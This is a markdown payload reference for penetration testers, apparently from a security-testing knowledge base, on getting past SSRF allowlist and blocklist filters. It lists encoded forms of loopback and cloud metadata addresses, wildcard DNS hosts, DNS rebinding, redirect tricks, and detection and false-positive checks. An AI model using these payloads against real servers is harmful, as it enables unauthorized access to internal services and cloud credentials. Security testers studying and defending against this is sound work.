# SSRF Filter Bypass (IP obfuscation) — payload reference

> Narrow focus on bypassing allowlist/blocklist filters built on STRING comparison of IP/hostname
> (that do not distinguish representations of the same address). Complements `blind_ssrf.md` (entry
> points + OOB detection) — this file is about the PAYLOAD itself that defeats a naive filter.
> Cross-ref: `invariant_library.md` → `## § Web2` (Task 8 will add an `SSRF guard` row, whose
> anti-fingerprint is precisely "blocklist by string, bypassed by decimal/octal/DNS-rebind" — at the
> time of this file the reference may be `[UNPINNED]`).

## Payloads

All variants below resolve to `127.0.0.1` (loopback) — apply the same principle for
`169.254.169.254` (cloud metadata) and arbitrary RFC1918 addresses (`10.x`, `172.16-31.x`,
`192.168.x`).

- **Decimal (integer) representation**: `http://2130706433/` (= `127.0.0.1` as a 32-bit integer).
  For metadata: `http://2852039166/` (= `169.254.169.254`).
- **Octal representation**: `http://0177.0.0.1/`, or fully octal `http://00000000177.0.0.0.1/`
  (each octet with a leading zero).
- **Hex representation**: `http://0x7f000001/` (as a single number) or per-octet `http://0x7f.0x0.0x0.0x1/`.
- **Mixed representation (mixed-radix)**: `http://0x7f.0.0.1/` (first octet hex, the rest decimal) —
  many parsers accept non-uniform formats within a single address.
- **Short-form IPv4**: `http://127.1/` (equivalent to `127.0.0.1`, the parser treats it as
  `127.0.0.1` by zero-filling the middle octets), `http://127.0.1/`.
- **IPv6-mapped IPv4**: `http://[::ffff:127.0.0.1]/`, `http://[::ffff:7f00:1]/` (hex form of the same).
- **IPv6 loopback variants**: `http://[::1]/`, `http://[0:0:0:0:0:0:0:1]/`, `http://[0000::1]/`
  (zero expansion).
- **Unicode fullwidth digits**: `http://１２７．０．０．１/` (fullwidth version of `127.0.0.1`) — some
  Unicode-normalizing HTTP clients/parsers on the backend collapse this to plain ASCII before
  resolving, and a blocklist regex that runs BEFORE normalization will let it through.
- **DNS-based (public wildcard resolvers to loopback/internal)**: `http://localtest.me/` (resolves
  to `127.0.0.1`), `http://127.0.0.1.nip.io/`, `http://customer1.169.254.169.254.nip.io/` (nip.io
  embeds the IP directly in the hostname → resolves to IT).
- **DNS rebinding**: register a domain on a DNS server with a very short TTL that returns a public IP
  on the FIRST resolve (the TOCTOU allowlist-check moment, passes the check) and `127.0.0.1`/an
  internal IP on the SECOND resolve (the moment of the real fetch — if the app resolves TWICE, once
  for the check and once for connect). Tooling: `singularity-of-origin` / your own DNS server with
  TTL=0.
- **Redirect-based bypass**: if the allowlist checks only the INITIAL URL but the server's HTTP
  client follows redirects — return `302 Location: http://169.254.169.254/...` from your allowlisted
  domain.
- **Trailing dot + case on a hostname allowlist**: `http://EvilHost.com./` — a trailing dot is valid
  in DNS but can bypass a string comparison against an allowlist entry that has no dot.

## Detection Signal

- All the variants above should have an IDENTICAL effect to a direct `http://127.0.0.1/` (or
  `169.254.169.254/`) request from the server's point of view — if the direct request is blocked by
  the allowlist (400/403/timeout) but one of the obfuscated forms passes (200 with internal content,
  or an OOB hit on an internal service) — a confirmed filter bypass.
- For DNS rebinding: proof requires TWO different answers from your DNS server within ONE application
  request (the DNS-server log shows 2+ queries with different returned IPs) — single-query logic will
  not prove a rebind, only a statically different DNS answer count.

## Anti-FP

- Many HTTP client libraries (not the application code itself) already normalize/resolve
  decimal-octal-hex forms BEFORE reaching custom allowlist code — if the allowlist check happens
  AFTER resolution (on the final IP, not the URL string), these bypasses will not work; that is the
  CORRECT architecture, do not confuse it with the vulnerable one (blocklist by string, applied
  BEFORE resolution).
- DNS rebinding requires the app to actually resolve the hostname TWICE (once check, once connect) —
  if it resolves once and reuses the IP throughout the request, a rebind is structurally impossible;
  do not claim a finding without confirming double-resolve behavior.
- IPv6 loopback variants will not work if the server does not listen/resolve IPv6 at all (dual-stack
  disabled) — check connectivity BEFORE declaring the bypass failed for the IPv6 branches.
